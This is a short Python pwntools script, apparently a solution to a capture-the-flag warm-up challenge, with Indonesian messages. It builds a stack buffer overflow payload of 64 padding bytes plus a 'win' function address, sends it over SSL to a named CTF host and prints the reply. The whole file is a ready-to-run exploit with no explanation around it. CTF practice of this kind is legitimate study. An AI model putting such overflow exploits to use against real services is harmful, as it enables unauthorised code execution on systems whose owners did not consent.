#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64' 
context.os = 'linux'
context.log_level = 'debug'

ALAMAT_WIN = 0x00401180
OFFSET_PADDING = 64

payload = b""
payload += b"A" * OFFSET_PADDING
payload += p64(ALAMAT_WIN) 

try:
    p = remote("pemanasan-1.ctf.forestylab.com", 5000, ssl=True)
except Exception as e:
    print("Gagal terhubung. Periksa koneksi atau nama host.")
    print(f"Error: {e}")
    exit()

try:
    p.recvuntil(b": ") 
    
    print("Mengirim payload...")
    p.sendline(payload)
    
    print("Payload terkirim. Menerima respons...")
    response = p.recvall()
    
    print("Respons Diterima:")
    print(response.decode())

except EOFError:
    print("Koneksi ditutup oleh server sebelum respons penuh diterima.")
except Exception as e:
    print(f"Terjadi error saat komunikasi: {e}")
finally:
    p.close()

